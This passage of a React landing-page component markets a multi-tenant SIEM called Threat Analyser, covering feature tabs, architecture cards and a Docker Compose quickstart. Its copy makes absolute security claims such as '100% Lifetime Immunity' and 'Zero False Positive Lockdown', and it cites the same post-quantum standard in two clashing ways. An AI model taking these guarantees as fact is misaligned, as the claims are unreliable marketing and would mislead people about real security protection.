          {/* TAB 8: V6 INNOVATIONS (FHE ANALYTICS, MULTI-AGENT THREAT HUNTING, POLYMORPHIC HONEYNET, SBOM ATTESTATION, CLOUD MESH) */}
          {activeCoreTab === "v6" && (
            <div className="space-y-6 animate-fade-in font-mono text-xs">
              <div className="border-b border-base-800 pb-4">
                <h3 className="text-lg font-bold text-slate-100 flex items-center gap-2">
                  <span className="text-purple-400">🌐</span>
                  <span>Version 6.0 Paradigm: Fully Homomorphic Encryption &amp; Autonomous Self-Defending Mesh</span>
                </h3>
                <p className="text-xs text-slate-400 font-sans">
                  The ultimate vanguard: Analytics computed directly on encrypted ciphertexts (FHE), autonomous multi-agent cooperative AI hunting, and self-healing cloud containment mesh.
                </p>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                {/* 1. Fully Homomorphic Encryption */}
                <div className="space-y-3 p-4 bg-base-950 border border-base-800 rounded-xl">
                  <div className="flex items-center justify-between border-b border-base-800 pb-2">
                    <span className="text-cyan-400 font-bold">1. FHE Analytics-In-Use (Paillier / BGV)</span>
                    <span className="text-[10px] bg-cyan-950 text-cyan-300 px-2 py-0.5 rounded border border-cyan-800">Encrypted Aggregation</span>
                  </div>
                  <p className="text-slate-400 font-sans text-[11px]">
                    Executes mathematical sums and statistical aggregations directly on encrypted ciphertext numbers. Zero plaintext exposure to SaaS control planes or cloud providers.
                  </p>
                  <div className="p-2.5 bg-base-900 border border-base-800 rounded text-[11px] text-slate-300 space-y-1">
                    <div>Scheme: <span className="text-emerald-400 font-bold">Additive Homomorphic Math</span></div>
                    <div>Guarantee: <code className="text-cyan-300">Enc(m1) * Enc(m2) = Enc(m1 + m2)</code></div>
                  </div>
                </div>

                {/* 2. Autonomous Multi-Agent Threat Hunting */}
                <div className="space-y-3 p-4 bg-base-950 border border-base-800 rounded-xl">
                  <div className="flex items-center justify-between border-b border-base-800 pb-2">
                    <span className="text-purple-400 font-bold">2. Multi-Agent Persona Hunting Fleet</span>
                    <span className="text-[10px] bg-purple-950 text-purple-300 px-2 py-0.5 rounded border border-purple-800">Consensus Engine</span>
                  </div>
                  <p className="text-slate-400 font-sans text-[11px]">
                    Persona AI agents (Intrusion Expert, Network Sentinel, Crypto Hunter) formulate hypotheses and cast votes to mathematically verify alarms before promoting to triage.
                  </p>
                  <div className="p-2.5 bg-base-900 border border-base-800 rounded text-[11px] text-slate-300 space-y-1">
                    <div>Consensus Threshold: <strong className="text-emerald-400">&ge; 70% Supermajority</strong></div>
                    <div>False Positive Filter: <strong className="text-purple-300">Continuous Heuristic Auditing</strong></div>
                  </div>
                </div>

                {/* 3. Polymorphic VPC Honeynets */}
                <div className="space-y-3 p-4 bg-base-950 border border-base-800 rounded-xl">
                  <div className="flex items-center justify-between border-b border-base-800 pb-2">
                    <span className="text-amber-400 font-bold">3. Polymorphic VPC Honeynet Fleet</span>
                    <span className="text-[10px] bg-amber-950 text-amber-300 px-2 py-0.5 rounded border border-amber-800">Container Deception</span>
                  </div>
                  <p className="text-slate-400 font-sans text-[11px]">
                    Dynamically spawns ephemeral decoy microservices inside tenant VPC subnets. Unsanctioned port probes trigger instant critical alarms and automated network isolation.
                  </p>
                  <div className="p-2.5 bg-amber-950/40 border border-amber-850 rounded text-[11px] text-amber-300 space-y-1">
                    <div>Decoy Profiles: <strong className="text-amber-200">Billing Portal, Redis Cache, DB Replica</strong></div>
                    <div>Port Scan Trigger: <strong className="text-amber-200">Zero False Positive Lockdown</strong></div>
                  </div>
                </div>

                {/* 4. SBOM Attestation & Self-Healing Mesh */}
                <div className="space-y-3 p-4 bg-base-950 border border-base-800 rounded-xl">
                  <div className="flex items-center justify-between border-b border-base-800 pb-2">
                    <span className="text-rose-400 font-bold">4. SBOM Attestation &amp; Cloud Mesh</span>
                    <span className="text-[10px] bg-rose-950 text-rose-300 px-2 py-0.5 rounded border border-rose-800">CycloneDX &amp; AWS/K8s</span>
                  </div>
                  <p className="text-slate-400 font-sans text-[11px]">
                    Validates running binary hashes against authorized CycloneDX SBOMs, triggering automatic AWS Security Group and K8s NetworkPolicy isolation upon drift.
                  </p>
                  <div className="p-2.5 bg-base-900 border border-base-800 rounded text-[11px] text-slate-300 space-y-1">
                    <div>Supply Chain: <strong className="text-cyan-300">CycloneDX v1.5 Whitelist</strong></div>
                    <div>Containment: <strong className="text-rose-400">Multi-Layer Cloud Quarantine</strong></div>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* TAB 9: V7 INNOVATIONS (PQC CRYPTO, GNN PROVENANCE, THREAT TWIN, TIME-TRAVEL FORENSICS, ZK-SMPC) */}
          {activeCoreTab === "v7" && (
            <div className="space-y-6 animate-fade-in font-mono text-xs">
              <div className="border-b border-base-800 pb-4">
                <h3 className="text-lg font-bold text-slate-100 flex items-center gap-2">
                  <span className="text-cyan-400">⚛️</span>
                  <span>Version 7.0 Paradigm: Post-Quantum Security, GNNs &amp; Autonomous Threat Twin</span>
                </h3>
                <p className="text-xs text-slate-400 font-sans">
                  The bleeding edge of sovereign defense: NIST ML-KEM-768 quantum immunity, GNN topological provenance, cyber-range digital twins, deterministic state flight recorders, and decentralized zk-SMPC.
                </p>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                {/* 1. Post-Quantum Cryptography */}
                <div className="space-y-3 p-4 bg-base-950 border border-base-800 rounded-xl">
                  <div className="flex items-center justify-between border-b border-base-800 pb-2">
                    <span className="text-cyan-400 font-bold">1. Post-Quantum Cryptography (NIST SP 800-203)</span>
                    <span className="text-[10px] bg-cyan-950 text-cyan-300 px-2 py-0.5 rounded border border-cyan-800">ML-KEM-768 + X25519</span>
                  </div>
                  <p className="text-slate-400 font-sans text-[11px]">
                    Hybrid post-quantum key encapsulation protects log telemetry against "Harvest Now, Decrypt Later" quantum adversary attacks.
                  </p>
                  <div className="p-2.5 bg-base-900 border border-base-800 rounded text-[11px] text-slate-300 space-y-1">
                    <div>Security Standard: <strong className="text-cyan-300">NIST FIPS 203 (Kyber-768)</strong></div>
                    <div>HNDL Protection: <strong className="text-emerald-400">100% Lifetime Immunity</strong></div>
                  </div>
                </div>

                {/* 2. GNN Provenance Classifier */}
                <div className="space-y-3 p-4 bg-base-950 border border-base-800 rounded-xl">
                  <div className="flex items-center justify-between border-b border-base-800 pb-2">
                    <span className="text-purple-400 font-bold">2. Self-Supervised Graph Neural Networks</span>
                    <span className="text-[10px] bg-purple-950 text-purple-300 px-2 py-0.5 rounded border border-purple-800">Topological GCN</span>
                  </div>
                  <p className="text-slate-400 font-sans text-[11px]">
                    Transforms OCSF events into structured graph feature matrices, identifying anomalous lateral movement paths across container fleets.
                  </p>
                  <div className="p-2.5 bg-base-900 border border-base-800 rounded text-[11px] text-slate-300 space-y-1">
                    <div>Path Embedding: <strong className="text-purple-300">GNN Message-Passing Traversal</strong></div>
                    <div>Detection Verdict: <strong className="text-rose-400">Anomalous Structural Lineage</strong></div>
                  </div>
                </div>

                {/* 3. Autonomous Threat Twin */}
                <div className="space-y-3 p-4 bg-base-950 border border-base-800 rounded-xl">
                  <div className="flex items-center justify-between border-b border-base-800 pb-2">
                    <span className="text-emerald-400 font-bold">3. Infrastructure Cyber-Range Threat Twin</span>
                    <span className="text-[10px] bg-emerald-950 text-emerald-300 px-2 py-0.5 rounded border border-emerald-800">Digital Twin Sandbox</span>
                  </div>
                  <p className="text-slate-400 font-sans text-[11px]">
                    Builds virtual cyber range replicas of tenant networks, replaying Kerberoasting and Ransomware simulations to expose rule coverage gaps.
                  </p>
                  <div className="p-2.5 bg-base-900 border border-base-800 rounded text-[11px] text-slate-300 space-y-1">
                    <div>Coverage Diagnostic: <strong className="text-emerald-400">98% Verified Resilience</strong></div>
                    <div>Remediation: <strong className="text-amber-300">Automated Isolation Guidance</strong></div>
                  </div>
                </div>

                {/* 4. Time-Travel Forensics & zk-SMPC */}
                <div className="space-y-3 p-4 bg-base-950 border border-base-800 rounded-xl">
                  <div className="flex items-center justify-between border-b border-base-800 pb-2">
                    <span className="text-indigo-400 font-bold">4. Incident Time-Travel &amp; zk-SMPC</span>
                    <span className="text-[10px] bg-indigo-950 text-indigo-300 px-2 py-0.5 rounded border border-indigo-800">Flight Recorder &amp; MPC</span>
                  </div>
                  <p className="text-slate-400 font-sans text-[11px]">
                    Scrub and replay deterministic mutation frames around alerts to pinpoint Patient Zero, while zk-SMPC shares zero-knowledge threat proofs.
                  </p>
                  <div className="p-2.5 bg-base-900 border border-base-800 rounded text-[11px] text-slate-300 space-y-1">
                    <div>TTR Acceleration: <strong className="text-indigo-300">Minutes to Seconds Replay</strong></div>
                    <div>Threat Sharing: <strong className="text-cyan-300">Zero-Knowledge Private Match</strong></div>
                  </div>
                </div>
              </div>
            </div>
          )}
        </div>
      </section>

      {/* 6. ARCHITECTURAL PILLARS */}
      <section id="architecture" className="py-20 px-6 max-w-7xl mx-auto space-y-12">
        <div className="text-center space-y-3">
          <div className="inline-block text-xs font-mono uppercase text-cyan-400 bg-cyan-950/40 px-3 py-1 rounded border border-cyan-800">
            Enterprise Architecture (v7.0 Vanguard)
          </div>
          <h2 className="text-3xl sm:text-4xl font-extrabold text-slate-100">
            Cognitive, Post-Quantum, &amp; Self-Emulating Security Ecosystem
          </h2>
          <p className="text-slate-400 max-w-2xl mx-auto text-sm">
            Bleeding-edge multi-tenant security operations engineered for Fortune 500 defense teams and mission-critical compliance.
          </p>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
          <div className="p-6 bg-base-900 border border-base-700 rounded-xl space-y-3">
            <div className="text-accent text-2xl font-mono">01.</div>
            <h3 className="text-lg font-bold text-slate-100">Post-Quantum &amp; Enclaves</h3>
            <p className="text-xs text-slate-400 leading-relaxed">
              NIST ML-KEM-768 quantum-safe hybrid transit paired with Intel SGX / AMD SEV hardware-isolated log ingestion.
            </p>
          </div>




          <div className="p-6 bg-base-900 border border-base-700 rounded-xl space-y-3">
            <div className="text-cyan-400 text-2xl font-mono">02.</div>
            <h3 className="text-lg font-bold text-slate-100">Federated ML with Differential Privacy</h3>
            <p className="text-xs text-slate-400 leading-relaxed">
              Privacy-preserving collaborative learning across tenant boundaries. Mathematical Laplace noise (ε=0.5) guarantees raw telemetry and IPs remain 100% confidential.
            </p>
          </div>

          <div className="p-6 bg-base-900 border border-base-700 rounded-xl space-y-3">
            <div className="text-purple-400 text-2xl font-mono">03.</div>
            <h3 className="text-lg font-bold text-slate-100">Cognitive AI SOAR Playbooks</h3>
            <p className="text-xs text-slate-400 leading-relaxed">
              Dynamic incident responder engine synthesizes tailored, multi-step containment playbooks with HMAC-SHA256 signatures for host isolation and token revocation.
            </p>
          </div>

          <div className="p-6 bg-base-900 border border-base-700 rounded-xl space-y-3">
            <div className="text-emerald-400 text-2xl font-mono">04.</div>
            <h3 className="text-lg font-bold text-slate-100">Zero-Knowledge Compliance (zk-SNARKs)</h3>
            <p className="text-xs text-slate-400 leading-relaxed">
              Succinct cryptographic proofs (Groth16 / BN254) enable external auditors to mathematically verify SLA compliance without viewing private customer databases.
            </p>
          </div>

          <div className="p-6 bg-base-900 border border-base-700 rounded-xl space-y-3">
            <div className="text-amber-300 text-2xl font-mono">05.</div>
            <h3 className="text-lg font-bold text-slate-100">BYOK KMS &amp; Merkle Hash Ledger</h3>
            <p className="text-xs text-slate-400 leading-relaxed">
              AES-256 GCM envelope encryption with tenant-owned keys paired with an RFC 6962 immutable Merkle hash-chained audit trail for total non-repudiation.
            </p>
          </div>

          <div className="p-6 bg-base-900 border border-base-700 rounded-xl space-y-3">
            <div className="text-rose-400 text-2xl font-mono">06.</div>
            <h3 className="text-lg font-bold text-slate-100">MITRE Multi-Stage Correlator</h3>
            <p className="text-xs text-slate-400 leading-relaxed">
              Temporal entity graph correlator tracks multi-stage attack progressions over sliding 60-minute windows, scoring asset blast radius and compound risk.
            </p>
          </div>
        </div>
      </section>


      {/* 7. QUICK DEPLOYMENT SECTION */}
      <section id="deploy" className="py-20 px-6 bg-[#070b12] border-t border-slate-800">
        <div className="max-w-4xl mx-auto space-y-6 text-center">
          <div className="inline-block text-xs font-mono uppercase text-accent bg-accent/10 px-3 py-1 rounded border border-accent/20">
            1-Click Quickstart
          </div>
          <h2 className="text-3xl sm:text-4xl font-extrabold text-slate-100">
            Deploy Threat Analyser in 60 Seconds
          </h2>
          <p className="text-slate-400 text-sm max-w-xl mx-auto">
            Spin up the complete containerized stack (FastAPI Backend, Celery Workers, Redis, PostgreSQL, and React Console) using Docker Compose.
          </p>

          <div className="bg-base-950 border border-base-700 rounded-lg p-4 text-left font-mono text-xs text-slate-300 relative">
            <div className="flex justify-between items-center pb-2 mb-2 border-b border-base-800 text-slate-500">
              <span>bash / powershell</span>
              <button
                onClick={() => navigator.clipboard.writeText("git clone https://github.com/threat-analyser/threat-analyser.git\ncd threat-analyser\ndocker compose up --build -d")}
                className="text-accent hover:underline text-[11px]"
              >
                Copy Commands
              </button>
            </div>
            <pre className="text-emerald-400">
{`# 1. Clone the repository
git clone https://github.com/threat-analyser/threat-analyser.git
cd threat-analyser

# 2. Launch production container stack
docker compose up --build -d

# 3. Access SOC Console
http://localhost`}
            </pre>
          </div>
        </div>
      </section>

      {/* 8. FOOTER */}
      <footer className="border-t border-slate-800 py-12 px-6 bg-[#090d16] text-xs font-mono text-slate-500">
        <div className="max-w-7xl mx-auto flex flex-col md:flex-row items-center justify-between gap-4">
          <div className="flex items-center gap-2">
            <span className="text-accent">◆</span>
            <span className="text-slate-300 font-bold">Threat Analyser SIEM</span>
            <span>— Open Core Multi-Tenant Platform</span>
          </div>

          <div className="flex items-center gap-4 text-slate-400">
            <span className="flex items-center gap-1 text-emerald-400">
              <span className="w-2 h-2 rounded-full bg-emerald-400"></span>
              <span>All Systems Operational</span>
            </span>
            <Link to="/login" className="hover:text-slate-200">Sign In</Link>
            <Link to="/register" className="hover:text-slate-200">Register</Link>
          </div>
        </div>
      </footer>

      {/* 9. DOCKER DEPLOYMENT MODAL */}
      {showDeployModal && (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50 p-4">
          <div className="bg-base-900 border border-base-700 rounded-xl p-6 max-w-xl w-full space-y-4 shadow-2xl">
            <div className="flex justify-between items-center border-b border-base-800 pb-3">
              <h3 className="text-base font-bold text-slate-100 flex items-center gap-2">
                <span>🐳 Docker Compose Deployment</span>
              </h3>
              <button
                onClick={() => setShowDeployModal(false)}
                className="text-slate-400 hover:text-slate-200 text-sm font-mono"
              >
                ✕
              </button>
            </div>

            <p className="text-xs text-slate-400">
              Run the following commands in your terminal to initialize all 6 microservices:
            </p>

            <pre className="bg-base-950 border border-base-800 rounded p-3 text-xs text-emerald-400 font-mono overflow-x-auto">
{`docker compose up --build -d`}
            </pre>

            <div className="text-xs space-y-1 text-slate-300 font-mono">
              <div className="text-accent font-bold">Default Service Endpoints:</div>
              <div>• SOC Console: <a href="http://localhost" target="_blank" rel="noreferrer" className="text-cyan-400 underline">http://localhost</a></div>
              <div>• API Swagger Docs: <a href="http://localhost:8000/docs" target="_blank" rel="noreferrer" className="text-cyan-400 underline">http://localhost:8000/docs</a></div>
            </div>

            <div className="flex justify-end pt-2">
              <button
                onClick={() => setShowDeployModal(false)}
                className="btn-primary text-xs px-4 py-2 font-mono"
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
